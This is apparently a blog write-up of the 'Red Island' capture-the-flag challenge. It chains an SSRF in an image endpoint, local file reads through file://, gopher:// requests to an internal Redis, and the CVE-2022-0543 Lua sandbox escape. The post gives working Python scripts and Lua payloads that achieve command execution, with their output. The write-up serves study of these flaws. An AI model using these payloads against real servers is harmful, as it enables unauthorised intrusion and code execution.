[{"content":"TL;DR The api/red/generate endpoint is vulnerable to SSRF attack, where the request is processed by node-libcurl. This library can be utilize multiple protocols, which come in handy to investigate the current running process.\nfile:///proc/self/cmdline file:///proc/self/pwd/index.js The implementation of the Redis service allows for the use of the gopher:// protocol, revealing the version to be 5.0.7, which is vulnerable to the CVE-2022-0543.\nIntroduction What I learned Basic SSRF with cross-protocol scripting (gopher:// scheme). Redis interaction with Lua sandbox escape. First use of Caido tool. Application Overview No source code is provided with this challenge, so I went straight to testing the web application after logging in. I submitted a valid image URL, which resulted in my sheep looking even more satanic than it already did.\nThere wasn\u0026rsquo;t much more to interact with on application.\nEnumeration For the first time I used the Caido tool, which is a promising alternative to Burp Suite. I sent the request to my Replay tab and started playing with it.\nSSRF with node-libcurl To test if the site was vulnerable to Server-Side Request Forgery, I first sent a URL that was not an image. If the application had processed my request correctly, it should have returned an error message. However, that wasn\u0026rsquo;t quite the case\u0026hellip;\nI received an error, but it included the response body of the requested link.\nThis diagram summarizes what happens behind the scenes during a basic SSRF attack. The input is always trusted and returned. If such user input is enabled, the error handling and input validation should be strengthened to allow only certain domains and return appropriate error messages.\nTo learn more about how the request was processed on the server side, I used interactsh to identify the library in use.\n1 2 3 4 GET / HTTP/1.1 Host: nblwybgjkdkdtwjedhnb54rribbndgeea.oast.fun Accept: */* User-Agent: node-libcurl/2.3.4 The library used is node-libcurl, which supports a wide range of protocols.\nlibcurl is a free and easy-to-use client-side URL transfer library, supporting DICT, FILE, FTP, FTPS, Gopher, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMTP, SMTPS, Telnet and TFTP. libcurl supports SSL certificates, HTTP POST, HTTP PUT, FTP uploading, HTTP form based upload, proxies, cookies, user+password authentication (Basic, Digest, NTLM, Negotiate, Kerberos), file transfer resume, http proxy tunneling and more!\nOfficial description of the node-libcurl library With this knowledge, I attempted to read a local file using the file:// scheme.\nRedis and the goofy gophers To learn more about the web application currently running, I read the /proc/self/cmdline file, which contains the command used to start the app.\nNext, I viewed the content of the index.js file located in /proc/self/cwd/index.js.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 const express= require(\u0026#39;express\u0026#39;); const app= express(); const session= require(\u0026#39;express-session\u0026#39;); const RedisStore = require(\u0026#34;connect-redis\u0026#34;)(session) const path = require(\u0026#39;path\u0026#39;); const cookieParser = require(\u0026#39;cookie-parser\u0026#39;); const nunjucks = require(\u0026#39;nunjucks\u0026#39;); const routes = require(\u0026#39;./routes\u0026#39;); const Database = require(\u0026#39;./database\u0026#39;); const { createClient } = require(\u0026#34;redis\u0026#34;) const redisClient= createClient({ legacyMode: true }) const db = new Database(\u0026#39;/tmp/redisland.db\u0026#39;); app.use(express.json()); app.use(cookieParser()); redisClient.connect().catch(console.error) \u0026lt;SNIP\u0026gt; Redis or REmote DIctionary Server is a popular service for caching data in memory.\nIn this application, Redis is used for session storage with redisClient.connect(). With no options provided, I assumed it was connected to the local address localhost:6379.\nI am aware that Redis implements gopher, which was an alternative to the World Wide Web in the late 90\u0026rsquo;s.\nGiven that node-libcurl supports multiple protocols for SSRF, and gopher can be used to communicate with the Redis client, I performed a Cross-Protocol Scripting attack using the gopher:// scheme.\nTo automate this, I wrote a python script:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 from urllib.parse import quote import requests URL = \u0026#34;http://\u0026lt;TARGET:HOST\u0026gt;/api/red/generate\u0026#34; payload = quote(\u0026#34;\u0026#34;\u0026#34; INFO quit \u0026#34;\u0026#34;\u0026#34;) input = {\u0026#34;url\u0026#34;:f\u0026#34;gopher://localhost:6379/_{payload}\u0026#34;} headers = {\u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;Cookie\u0026#34;: \u0026#34;connect.sid=\u0026lt;SESSION_COOKIE\u0026gt;\u0026#34;} request = requests.post(url=URL, json=input, headers=headers) print(str(request.json()).replace(\u0026#34;\\\\n\u0026#34;, \u0026#34;\\n\u0026#34;).replace(\u0026#34;\\\\r\u0026#34;, \u0026#34;\u0026#34;)) I submitted this payload to gather more information on the current Redis instance.\n1 2 3 4 5 6 7 8 9 # Server redis_version:5.0.7 redis_git_sha1:00000000 redis_git_dirty:0 redis_build_id:636cde3b5c7a3923 redis_mode:standalone os:Linux 6.1.0-10-amd64 x86_64 arch_bits:64 \u0026lt;SNIP\u0026gt; A search for vulnerabilities in this specific version of Redis (5.0.7) led me to CVE-2022-0543, discovered by Reginaldo Silva.\nExploitation Why? This vulnerability does not originate directly from Redis. On specific distributions, Lua is loaded dynamically, which allowed me to perform a Remote Code Execution on the host by escaping the Lua sandbox.\nThis vulnerability existed because the Lua library in Debian/Ubuntu is provided as a dynamic library. A package variable was automatically populated that in turn permitted access to arbitrary Lua functionality.\nVulhub GitHub: Redis Lua Sandbox Escape and Remote Code Execution (CVE-2022-0543) PoC 1 2 3 4 5 6 7 8 9 -- loading \u0026#34;luaopen_io\u0026#34; module from the library to execute a command local io_l = package.loadlib(\u0026#34;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\u0026#34;, \u0026#34;luaopen_io\u0026#34;); local io = io_l(); -- executing the command \u0026#39;id\u0026#39; local f = io.popen(\u0026#34;id\u0026#34;, \u0026#34;r\u0026#34;); -- reading and returning the output of the command local res = f:read(\u0026#34;*a\u0026#34;); f:close(); return res I passed this payload to the eval command of the Redis client.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from urllib.parse import quote import requests URL = \u0026#34;http://\u0026lt;TARGET:HOST\u0026gt;/api/red/generate\u0026#34; payload = quote(\u0026#34;\u0026#34;\u0026#34; eval \u0026#39;local io_l = package.loadlib(\u0026#34;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\u0026#34;, \u0026#34;luaopen_io\u0026#34;); local io = io_l(); local f = io.popen(\u0026#34;id\u0026#34;, \u0026#34;r\u0026#34;); local res = f:read(\u0026#34;*a\u0026#34;); f:close(); return res\u0026#39; 0 quit \u0026#34;\u0026#34;\u0026#34;) input = {\u0026#34;url\u0026#34;:f\u0026#34;gopher://\u0026lt;TARGET:HOST\u0026gt;:6379/_{payload}\u0026#34;} headers = {\u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;Cookie\u0026#34;: \u0026#34;\u0026lt;SESSION_COOKIE\u0026gt;\u0026#34;} request = requests.post(url=URL, json=input, headers=headers) print(str(request.json()).replace(\u0026#34;\\\\n\u0026#34;, \u0026#34;\\n\u0026#34;).replace(\u0026#34;\\\\r\u0026#34;, \u0026#34;\u0026#34;)) I was able to successfully achieve RCE on the host.\n1 2 3 4 5 6 $ python script.py {\u0026#39;message\u0026#39;: \u0026#39;Unknown error occured while fetching the image file: $48 uid=101(redis) gid=101(redis) groups=101(redis) +OK \u0026#39;} The flag was located at the system root as an executable.\n1 2 3 4 5 $ python script.py {\u0026#39;message\u0026#39;: \u0026#39;Unknown error occured while fetching the image file: $32 HTB{\u0026lt;REDACTED\u0026gt;} +OK \u0026#39;} References https://portswigger.net/web-security/ssrf https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html https://www.npmjs.com/package/node-libcurl https://docs.kernel.org/filesystems/proc.html https://redis.io https://en.wikipedia.org/wiki/Gopher_(protocol) https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce ","date":"2024-06-06T00:00:00Z","image":"https://wiloti.github.io/p/red_island/cover_hu8248267821472344247.png","permalink":"https://wiloti.github.io/p/red_island/","title":"Red Island"}]